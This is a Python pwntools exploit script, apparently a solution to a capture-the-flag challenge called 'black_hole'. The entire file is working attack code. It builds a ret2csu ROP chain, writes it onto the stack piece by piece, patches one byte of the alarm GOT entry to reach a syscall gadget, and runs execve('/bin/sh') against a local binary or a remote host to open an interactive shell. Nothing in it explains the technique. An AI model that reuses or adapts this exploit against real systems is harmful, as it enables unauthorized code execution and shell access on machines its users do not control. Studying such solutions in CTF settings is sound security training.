from pwn import *
from time import sleep
import sys
gadget_1=p64(0x00000000004007A6)
gadget_2=p64(0x0000000000400790)
 
addr_got_read=0x0000000000601028
addr_bss=0x0000000000601060
addr_got_alarm=0x0000000000601020
 
 
payload =gadget_1
payload+=p64(0)
payload+=p64(0)#rbx
payload+=p64(1)#rbp
payload+=p64(addr_got_read)#r12
payload+=p64(1)#r13rdx read num
payload+=p64(addr_got_alarm)#r14rsireadgot
payload+=p64(0x0)#r15edi read 0
payload+=gadget_2
 
payload+=p64(0)
payload+=p64(0)#rbx
payload+=p64(1)#rbp
payload+=p64(addr_got_read)#r12
payload+=p64(0x3B)
payload+=p64(addr_bss)#r14rsireadbss
payload+=p64(0x0)
payload+=gadget_2
 
payload+=p64(0)
payload+=p64(0)#rbx
payload+=p64(1)#rbp
payload+=p64(addr_bss+8)#r12
payload+=p64(0)
payload+=p64(0)
payload+=p64(addr_bss)
payload+=gadget_2
 
def write_stack(content, sec = 0.5):
    p.sendline("2333")
    sleep(sec)
    p.send(content.rjust(0x18, "a") + p64(main))
    sleep(sec)
 
if sys.argv[1] == "0":
    off = 0x5
    p = process("./black_hole")
    sec = 0.2
else:
    off = 5
    p = remote("106.75.66.195",  11003)
    sec = 1.5
 
main = 0x0000000000400704
log.info("write stack...")
for i in xrange(len(payload), 0, -8):
    print i
    write_stack(payload[i-8:i], sec)
 
p.sendline("2333")
sleep(sec)
p.send("a"*0x18 + p64(0x00000000004006CB))
sleep(sec)
log.info("try %s..." % hex(off))
p.send(chr(off))  # ovwer write one byte
sleep(sec)
 
payload2 = "/bin/sh\x00"
payload2 += p64(0x0000000000400540)
payload2 += (0x3B - len(payload2) - 1) * "a"
p.sendline(payload2)
 
p.interactive()
